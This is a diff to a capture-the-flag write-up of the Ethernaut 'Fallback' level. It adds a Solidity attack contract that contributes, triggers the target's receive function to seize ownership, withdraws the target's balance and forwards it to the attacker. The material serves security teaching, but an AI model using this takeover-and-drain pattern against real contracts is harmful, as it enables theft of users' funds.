@@ -4,7 +4,7 @@ This report covers the analysis of the Ethernaut level "Fallback".
 The goal of the challenge is to identify and exploit a vulnerability in the provided contract in order to claim ownership of the contract and reduce its balance to 0.
 
 The contract's code:
-```js
+```solidity
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
 
@@ -81,4 +81,46 @@ Avoid implementing fallback or receive functions that contain conflicting or uni
 The level demonstrates how a poorly implemented receive (fallback) function can compromise contract ownership allow fund theft.
 # Notes
 [Ethernaut Fallback Level](https://ethernaut.openzeppelin.com/level/0x3c34A342b2aF5e885FcaA3800dB5B205fEfa3ffB)
+# Exploit
+```solidity
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.8.0;
 
+interface Fallback {
+    function owner() external view returns (address);
+    function contribute() external payable;
+    function withdraw() external;
+    function getContribution() external view returns (uint256);
+    receive() external payable;
+}
+
+contract Exploit {
+    Fallback public immutable fb;
+    address public owner;
+
+    // Constructor loads vulnerable contract and sets attack contract's owner
+    constructor(address payable _contractAddress) payable {
+        owner = msg.sender;
+        fb = Fallback(_contractAddress);
+    }
+
+    function exploit() external payable {
+        uint256 value = 0.0000001 ether;
+
+        if ( fb.getContribution() == 0 ) {
+            fb.contribute{value: value}();
+        }
+
+        (bool sent, ) = address(fb).call{value: value}("");
+        require(sent);
+
+        fb.withdraw();
+    }
+
+    function withdraw() external {
+        payable(owner).transfer(address(this).balance);
+    }
+
+    receive() external payable { }
+}
+```
